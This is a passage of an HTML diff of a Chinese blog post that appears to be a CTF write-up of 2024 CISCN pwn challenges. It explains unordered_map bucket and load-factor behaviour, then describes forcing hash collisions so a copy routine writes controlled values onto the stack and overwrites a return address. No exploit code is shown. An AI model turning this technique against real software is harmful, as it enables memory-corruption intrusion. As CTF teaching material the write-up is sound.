+class="math inline">\(\text{load factor} =
+\frac{\text{size}}{\text{bucket count}}\)</span></li>
+<li>如果装载因子超出预设值，<code>unordered_map</code> 会自动
+<strong>增大桶的数量</strong>（通常翻倍），并重新分配键值对以减少冲突。</li>
+</ul></li>
 </ol>
-<hr>
+<hr />
 <p><strong>2. 哪些键值对会存在一个桶里</strong></p>
-<ol>
-<li><strong>相同哈希值的键</strong>:<ul>
+<ol type="1">
+<li><strong>相同哈希值的键</strong>:
+<ul>
 <li>当两个键的哈希值相同时，这两个键的键值对会落入同一个桶中。</li>
 <li>哈希表仅使用哈希值确定桶索引，因此不能保证桶内的键值对顺序。</li>
-</ul>
-</li>
-<li><strong>解决冲突：键的等价性</strong>:<ul>
-<li>即使键的哈希值相同，也需要使用等价性比较（通常是 <code>operator==</code>）来确认键是否完全相等。</li>
-<li>如果键通过 <code>==</code> 比较不同，<code>unordered_map</code> 将允许它们共存于一个桶中（但不会作为同一键处理）。</li>
-</ul>
-</li>
-<li><strong>插入新键值对</strong>:<ul>
-<li>当插入一个新键时，unordered_map<ol>
+</ul></li>
+<li><strong>解决冲突：键的等价性</strong>:
+<ul>
+<li>即使键的哈希值相同，也需要使用等价性比较（通常是
+<code>operator==</code>）来确认键是否完全相等。</li>
+<li>如果键通过 <code>==</code> 比较不同，<code>unordered_map</code>
+将允许它们共存于一个桶中（但不会作为同一键处理）。</li>
+</ul></li>
+<li><strong>插入新键值对</strong>:
+<ul>
+<li>当插入一个新键时，unordered_map
+<ol type="1">
 <li>通过哈希函数计算出桶索引。</li>
-<li>遍历该桶内的链表，检查是否有等价键（利用 <code>==</code> 比较）。</li>
+<li>遍历该桶内的链表，检查是否有等价键（利用 <code>==</code>
+比较）。</li>
 <li>若存在等价键，覆盖其值；否则将新键值对插入该桶。</li>
+</ol></li>
+</ul></li>
 </ol>
-</li>
-</ul>
-</li>
-</ol>
-<p>我们动调时发现，在part2功能里的copy函数中，会往栈上写内容。这里比如我们在part1功能中先输入键为3，值为4。然后对比copy执行前后，发现这里往栈上写了键值对<3,4>，其实我们仔细分析copy函数的参数，能发现一个<strong>_Local_iterator</strong>迭代器，这里其实就是把在一个桶中的键值存到栈上。那么只要我们把用part1功能加入hash冲突并在同一个桶里的多个键，就能够往栈上隔8字节写一个可控的值，这里返回地址刚好可以被值覆盖。</p>
+<p>我们动调时发现，在part2功能里的copy函数中，会往栈上写内容。这里比如我们在part1功能中先输入键为3，值为4。然后对比copy执行前后，发现这里往栈上写了键值对&lt;3,4&gt;，其实我们仔细分析copy函数的参数，能发现一个**_Local_iterator**迭代器，这里其实就是把在一个桶中的键值存到栈上。那么只要我们把用part1功能加入hash冲突并在同一个桶里的多个键，就能够往栈上隔8字节写一个可控的值，这里返回地址刚好可以被值覆盖。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
@@ -1260,7 +1293,11 @@
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20250124170922342.png"
                       class=""
                 >
-<p>但是在调试时，如果直接循环写入21个，会发现最终只会写到栈上一个。经过尝试，最终发现临界点是写入13个，这正好是我们的模数。C++ 中的 <code>std::unordered_map</code> 动态扩展机制类似于 C 的动态数组，会根据负载因子自动扩容（从 13 扩展到 29），新桶数组重新哈希分配，链表通过索引计算（如 <code>i * 29</code>）重新串联。这个29可以通过调试出来。之后会申请一个更大的0xf0大小的管理块，处理完毕后原来0x70大小的管理块会被释放掉。因为我们只用21个就能覆盖到返回地址，所以我们一开始都用模29的进行冲突，那么其扩容后就刚好可以存在一个桶里。</p>
+<p>但是在调试时，如果直接循环写入21个，会发现最终只会写到栈上一个。经过尝试，最终发现临界点是写入13个，这正好是我们的模数。C++
+中的 <code>std::unordered_map</code> 动态扩展机制类似于 C
+的动态数组，会根据负载因子自动扩容（从 13 扩展到
+29），新桶数组重新哈希分配，链表通过索引计算（如
+<code>i * 29</code>）重新串联。这个29可以通过调试出来。之后会申请一个更大的0xf0大小的管理块，处理完毕后原来0x70大小的管理块会被释放掉。因为我们只用21个就能覆盖到返回地址，所以我们一开始都用模29的进行冲突，那么其扩容后就刚好可以存在一个桶里。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
@@ -1464,7 +1501,7 @@
                     </span>
                     
                         <span>
-                            共 120k 字
+                            共 118.7k 字
                         </span>
                     
                 </p>
